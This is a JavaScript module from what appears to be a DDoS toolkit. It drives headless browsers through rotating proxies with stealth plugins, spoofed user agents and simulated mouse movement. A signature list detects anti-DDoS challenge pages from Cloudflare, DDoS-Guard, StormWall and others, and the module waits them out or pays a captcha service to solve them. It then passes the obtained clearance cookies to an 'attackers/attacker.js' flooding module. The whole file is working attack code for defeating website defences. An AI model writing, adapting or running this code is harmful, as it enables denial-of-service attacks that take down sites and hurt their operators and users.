const UserAgent = require('user-agents');
const puppeteer = require('puppeteer-extra');
const stealth = require('puppeteer-extra-plugin-stealth')();
const RecaptchaPlugin = require('puppeteer-extra-plugin-recaptcha')

const skippedResources = [
    'quantserve',
    'adzerk',
    'doubleclick',
    'adition',
    'exelator',
    'sharethrough',
    'cdn.api.twitter',
    'google-analytics',
    'googletagmanager',
    'google',
    'fontawesome',
    'facebook',
    'analytics',
    'optimizely',
    'clicktale',
    'mixpanel',
    'zedo',
    'clicksor',
    'tiqcdn',
];

const blockedResourceTypes = [
    'image',
    'media',
    'font',
    'texttrack',
    'object',
    'beacon',
    'csp_report',
    'imageset',
];

stealth.onBrowser = () => {};
puppeteer.use(stealth);

const base = {
    "js": [{
        "name": "Cloudflare",
        "navigations": 1,
        "html": "cf-browser-verification"
    }, {
        "name": "DDoS Guard",
        "navigations": 1,
        "html": `check.ddos-guard.net/check.js`
    }, {
        "name": "ArvanCloud",
        "navigations": 1,
        "html": '<h2 class="error-section__subtitle error-section__subtitle--waiting">Transferring to the website...</h2>'
    }, {
        "name": "Nooder",
        "navigations": 1,
        "html": `var NooderJS`
    }, {
        "name": "StormWall",
        "navigations": 1,
        "html": `<img src="https://static.stormwall.pro/ajax-loader.gif" />`
    }, {
        "name": "StormWall Silent",
        "navigations": 1,
        "html": '<link rel="stylesheet" href="https://static.stormwall.pro/captcha.css">'
    }, {
        "name": "StormWall Silent",
        "navigations": 1,
        "html": '<link rel="stylesheet" href="https://static.stormwall.pro/captcha.css">'
    }, {
        "name": "BlazingFast",
        "navigations": 1,
        "html": '<br>DDoS Protection by</font> Blazingfast.io</a>'
    }, {
        "name": "BlazingFast 2",
        "navigations": 1,
        "html": '<script src="/bf.jquery.max.js"></script>'
    }, {
        "name": "vShield",
        "navigations": 1,
        "html": 'https://dl.vshield.pro/ddos/main.js'
    }, {
        "name": "CyberDDoS",
        "navigations": 1,
        "html": '/cdn-cgi/challenge/v1/xscript.lib'
    }, {
        "name": "FluxCDN",
        "navigations": 1,
        "html": '<title>FluxCDN | Verifying Your Browser...</title>'
    }, {
        "name": "React",
        "navigations": 1,
        "html": '<script src="/vddosw3data.js"></script>'
    }, {
        "name": "CloudShield",
        "navigations": 1,
        "html": 'Performance, security and DDoS protection by <a href="https://cloud-shield.ru/?from=iua-js-en" target="_blank">Cloud‑Shield.ru</a>'
    }, {
        "name": "StackPath",
        "navigations": 1,
        "html": 'function genPid()'
    }, {
        "name": "FrostByte",
        "navigations": 1,
        "html": '<noscript><meta http-equiv="refresh" content="5"; url=""/>Your browser must support JavaScript, please enable JavaScript or change your browser'
    }, {
        "name": "LowHosting (or LZT)",
        "navigations": 1,
        "html": '<script src="/process-qv9ypsgmv9.js">'
    }, {
        "name": "MyArena",
        "navigations": 1,
        "html": '<title>Сайт под защитой Myarena.ru</title>'
    }, {
        "name": "MyArena Silent",
        "navigations": 1,
        "html": '<html><head></head><body>PLEASE, CHECK THAT COOKIES AND JAVASCRIPT IS ACTIVE<script type="text/javascript" src="/aes.js">'
    }, {
        "name": "CastSecurity",
        "navigations": 1,
        "html": '<h2 class="cf-subheadline"><span data-translate="complete_sec_check">Please complete the security check to access</span>'
    }, {
        "name": "CastSecurity Silent",
        "navigations": 2,
        "html": `var j='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=';`
    }, {
        "name": "MoscowOVH js",
        "navigations": 1,
        "html": `<div class="verification__title">`
    }, {
        "name": "WafOVH",
        "navigations": 1,
        "html": `<br>DDoS Protection by</font> <font class="alink">WAF.OVH</font>`
    }, {
        "name": "RuHoster",
        "navigations": 1,
        "html": `<head><title>Ru-hoster - L7 protection</title>`
    }],

    "captcha": [{
        "name": "DDoSGuard",
        "html": "/ddos-guard/captcha_js",
        "type": "ban"
    }, {
        "name": "DDoSGuard",
        "html": "Service is not available in your region",
        "type": "ban"
    }, {
        "name": "Cloudflare",
        "html": "Cloudflare to restrict access",
        "type": "ban"
    }, {
        "name": "Cloudflare",
        "html": "DNS points to prohibited IP",
        "type": "ban"
    }, {
        "name": "FrostByte",
        "html": "https://storage.frosbyte.org/protections/loader2.gif",
        "type": "ban"
    }, {
        "name": 'Cloudflare',
        "html": `cf_captcha_kind`,
        "type": "captcha"
    }, {
        "name": 'Cloudflare',
        "html": `Please complete the security check to access`,
        "type": "captcha"
    }, {
        "name": 'Cloudflare',
        "html": `cf_chl_captcha_tk`,
        "type": "captcha"
    }, {
        "name": "Anti-Ddos.pro",
        "html": '<img src="https://oauth.anti-ddos.pro/load.gif">',
        "type": "ban"
    }, {
        "name": "vShield",
        "html": '<h2>Your ip was flagged by our system.</h2>',
        "type": "ban"
    }]
};

var proxies = [];
var solutions = 0;

function log(text) {
    const date = new Date;
    const time = (date.getHours() < 10 ? "0" + date.getHours() : date.getHours()) + ":" + (date.getMinutes() < 10 ? "0" + date.getMinutes() : date.getMinutes()) + ":" + (date.getSeconds() < 10 ? "0" + date.getSeconds() : date.getSeconds());

    console.log(`(${time}) ${text}`)
}

function getUA(args) {
    return args.headers['user-agent'] == undefined ? new UserAgent().toString() : args.headers['user-agent'];
}

function findProtection(html) {
    let protection = false;
    if (html.length > 5) {
        for (let i = 0; i < base['js'].length; i++) {
            if (html.includes(base['js'][i].html)) {
                return base['js'][i];
            }
        }
    }
    return protection;
}


function findCaptcha(html) {
    let protection = false;
    if (html.length > 5) {
        for (let i = 0; i < base['captcha'].length; i++) {
            if (html.includes(base['captcha'][i].html)) {
                return base['captcha'][i];
            }
        }
    }
    return protection;
}

function randomInt(x, y) {
    return y ? Math.round(Math.random() * (y - x)) + x : Math.round(Math.random() * x);
}

function getProxy() {
    let proxy = proxies[0];
    proxies.splice(proxies.indexOf(proxy), 1);
    return proxy;
}

async function prepare_browser(args) {
    if (proxies.length < 1) return log("Finished Proxies (Browsers)");

    let proxy = getProxy();

    browser_create(args, proxy, getUA(args));
}

async function browser_create(args, proxy, useragent) {
    const options = {
        args: [
            '--proxy-server=' + proxy,
            '--user-agent=' + useragent,
            '--no-sandbox',
            '--disable-setuid-sandbox',
            '--disable-dev-shm-usage',
            '--disable-accelerated-2d-canvas',
            '--no-first-run',
            '--no-zygote',
            '--single-process',
            '--disable-gpu',
            '--hide-scrollbars',
            '--mute-audio',
            '--disable-gl-drawing-for-tests',
            '--disable-canvas-aa',
            '--disable-2d-canvas-clip-aa',
            '--disable-web-security',
            '--ignore-certificate-errors',
            '--ignore-certificate-errors-spki-list',
            '--disable-features=IsolateOrigins,site-per-process'
        ],
        ignoreHTTPSErrors: true,
        headless: true
    }
    try {
        const browser = await puppeteer.launch(options);
        const page = await browser.newPage();
        page.on('dialog', async dialog => {
            await dialog.accept();
        });
        //log(`${browser.process().pid} Opened.`);
        if (args.junk == 'false') {
            await page.setRequestInterception(true);
            await page.on('request', request => {
                const requestUrl = request._url.split('?')[0].split('#')[0];
                if (
                    blockedResourceTypes.indexOf(request.resourceType()) !== -1 ||
                    skippedResources.some(resource => requestUrl.indexOf(resource) !== -1)
                ) {
                    request.abort();
                } else {
                    request.continue();
                }
            })
        }

        await page.goto(args.target, {
            waitUntil: 'networkidle2'
        });

        // Refresh one time
        /*await page.reload({
            timeout: 4000,
            waitUntil: 'load'
        });*/
        await page.waitForTimeout(1000)

        let config = {
            pid: browser.process().pid, //pid 
            counter: 0, //counter of passed navigations
            proxy: proxy,
            protections: [], //solved protections
            useragent: useragent,
            imnotabot: setInterval(() => {
                page.mouse.move(randomInt(1, 1000), randomInt(1, 1000));
                page.mouse.down();
                page.mouse.move(randomInt(1, 1000), randomInt(1, 1000));
                page.mouse.up();
                page.mouse.move(randomInt(1, 1000), randomInt(1, 1000));
            }, 500)
        }
        if (args.click != 'false') {
            try {
                const clickText = text => {
                    return page.evaluate(text => [...document.querySelectorAll('*')].find(e => e.textContent.trim() === text).click(), text);
                };
                await clickText(args.click);
                await page.waitFor(2000);
                log("Current page:", page.url());
            } catch {

            }
        }
        //console.log(await page.content())
        if (!(args.delay == 'false')) await page.waitForTimeout(args.delay);
        return browser_jschecker(browser, page, args, config);
    } catch (e) {
        //console.log(e)
        prepare_browser(args);
        //browser_finish('false', 'false', args, config, 'false')
    }
}

function againJs(protection, config) {
    let again = false;

    for (let i = 0; i < config.protections.length; i++) {
        if (config.protections[i] == protection) {
            again = true;
        }
    }

    return again;
}

async function browser_jschecker(browser, page, args, config) {
    try {
        if (!(args.callback == 'false') && (args.callback <= Object.keys(await page.cookies()).length)) {
            config.protections.push("Callback")
            return browser_move(browser, page, args, config)
        }

        let cccaaa = findCaptcha(await page.content())
        if (cccaaa) {
            if (args.captcha == 'false') return browser_finish(browser, page, args, config, `detected ${cccaaa.type} from ${cccaaa.name}`)

            return browser_captcha(browser, page, args, config, cccaaa)
        }

        let protection = findProtection(await page.content());

        if (!(protection)) {
            return browser_move(browser, page, args, config)
        } else {
            if (againJs(protection.name, config)) return browser_finish(browser, page, args, config, `Proxy Detected By ${protection.name}!`)
            log(`${config.pid} [JS] Detected ${protection.name}`)
            if (!(protection.click == undefined)) await page.click(protection.click)
            for (let i = 0; i < protection.navigations; i++) {
                try {
                    /*setInterval(() => {
                        page.mouse.move(randomInt(1, 1000), randomInt(1, 1000));
                        page.mouse.down();
                        page.mouse.move(randomInt(1, 1000), randomInt(1, 1000));
                        page.mouse.up();
                        page.mouse.move(randomInt(1, 1000), randomInt(1, 1000));
                    }, 1000)*/
                    await page.waitForNavigation({
                        waitUntil: 'domcontentloaded',
                        timeout: 20000
                    });
                    //log(`${config.pid} [JS] Passed ${i + 1} navigation(s)`)
                } catch (e) {
                    // log(`${config.pid} [JS] Navigation error`)
                }
            }
            config.protections.push(protection.name)
                //config.counter = config.counter + 1
            browser_jschecker(browser, page, args, config)
        }
    } catch (e) {
        return browser_finish(browser, page, args, config, 'false')
    }
}

async function browser_captcha(browser, page, args, config, lmao) {
    if (lmao.type == 'ban') return browser_finish(browser, page, args, config, 'banned');
    if (solutions > args.max_captchas) {
        return browser_finish(browser, page, args, config, 'cant bypass captcha (limit)');
    }

    log(`${config.pid} [Captcha] Detected ${lmao.type} from ${lmao.name}`);


    await page.solveRecaptchas()
    try {
        await page.waitForNavigation({
            waitUntil: 'domcontentloaded',
            timeout: 15000
        });
    } catch (e) {
        return browser_finish(browser, page, args, config, 'cant bypass captcha (timeout)');
    }

    let body = findCaptcha(await page.content())
    if (!(body == false)) {
        return browser_finish(browser, page, args, config, 'cant bypass captcha (Unknown Problem)');
    }

    solutions = solutions + 1;
    config.protections.push(lmao.name + " Captcha");
    return browser_move(browser, page, args, config)
}

function normal_cookies(cookies) {
    let privet = "";
    for (let i = 0; i < cookies.length; i++) {
        privet += `${cookies[i].name}=${cookies[i].value};`
    }

    return privet.slice(0, -1);
}

async function browser_move(browser, page, args, config) {
    try {
        var page_Cookies = normal_cookies(await page.cookies()).trim();
        var page_Title = (await page.title()).toString().trim();
        if (config.protections.length > 0) log(`${config.pid} [Config] Solved protections: ${config.protections}`);
        if (page_Title == "" && page_Cookies == "") {
            log(`${config.pid} [STRANGE] Title: None!`);
        } else {
            log(`${config.pid} [Solved] Title: ${page_Title}`);
            log(`Cookies: ${page_Cookies}`)
            require('../attackers/attacker.js')(args, config.proxy, config.useragent, page_Cookies)
        }
        return browser_finish(browser, page, args, config, 'false');
    } catch (e) {
        log(e);
    }
}

async function browser_finish(browser, page, args, config, reason) {
    clearInterval(config.imnotabot);
    if (!(reason == 'false')) log(`${config.pid} [DEAD] ${reason}`);

    try {
        browser.close();
    } catch (e) {}
    prepare_browser(args);
}

function start(args, fuck) {
    proxies = fuck;

    puppeteer.use(
        RecaptchaPlugin({
            provider: {
                id: '2captcha',
                token: args.token,
            },
            visualFeedback: true,
        })
    )

    for (let i = 0; i < args.workers; i++) {
        prepare_browser(args);
    }
}

module.exports = start;